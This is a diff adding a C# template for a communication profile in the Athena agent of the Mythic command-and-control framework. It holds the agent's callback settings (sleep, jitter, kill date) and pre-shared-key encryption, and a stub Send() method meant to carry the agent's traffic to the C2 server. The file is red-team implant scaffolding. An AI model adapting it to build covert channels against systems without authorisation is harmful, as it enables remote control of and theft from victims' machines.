@@ -1,0 +1,124 @@
+﻿using Athena.Utilities;
+using Newtonsoft.Json;
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+namespace Athena.Config
+{
+    //////////////////////////////////////////////////////////////////////////////////////////////////////
+    //Instructions
+    //Replace all TEMPLATE with the name of your C2 Profile
+    //Update the TEMPLATE class with your C2 Profile name, and add the required Properties/Methods
+    //The Send() function is required and should be modified to send the request to the mythic server
+    //The Send() function should then decrypt (if necessary) and return the string as the function result
+    //////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    //This class contains the general information about the agent, and should be changed minimally
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    public class MythicConfig
+    {
+        public TEMPLATE currentConfig { get; set; }
+        public string uuid { get; set; }
+        public DateTime killDate { get; set; }
+        public int sleep { get; set; }
+        public int jitter { get; set; }
+        public SMBForwarder smbForwarder { get; set; }
+
+        public MythicConfig()
+        {
+
+            this.uuid = "%UUID%";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            this.sleep = sleep;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            this.jitter = jitter;
+            this.currentConfig = new TEMPLATE(this.uuid);
+            this.smbForwarder = new SMBForwarder();
+        }
+    }
+
+    public class TEMPLATE
+    {
+        //////////////////////
+        //Properties go here
+        //////////////////////
+        public bool encrypted { get; set; }
+        public string myproperty { get; set; }
+        public PSKCrypto crypt { get; set; }
+        public string psk { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+        ////////////////////////////////////////////////////
+        //Replace TEMPLATE with the name of your C2 Profile
+        ////////////////////////////////////////////////////
+        public TEMPLATE(string uuid)
+        {
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.psk = "AESPSK";
+            if (!string.IsNullOrEmpty(this.psk))
+            {
+                this.crypt = new PSKCrypto(uuid, this.psk);
+                this.encrypted = true;
+            }
+            /////////////////////////////
+            //constructor code goes here
+            /////////////////////////////
+        }
+        public async Task<string> Send(object obj)
+        {
+            try
+            {
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+                string json = JsonConvert.SerializeObject(obj);
+                if (this.encrypted)
+                {
+                    json = this.crypt.Encrypt(json);
+                }
+                else
+                {
+                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                }
+
+
+                /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //SEND GOES HERE
+                //Example:
+                //var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
+                /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+                ///////////////////////////////////////////////////////////
+                //READ THE RESPONSE HERE 
+                //Example:
+                //string msg = response.Content.ReadAsStringAsync().Result;
+                ///////////////////////////////////////////////////////////
+
+
+
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                if (this.encrypted)
+                {
+                    return this.crypt.Decrypt(json);
+                }
+                else
+                {
+                    return Misc.Base64Decode(json).Substring(36);
+                }
+            }
+            catch
+            {
+                return "";
+            }
+        }
+    }
+}
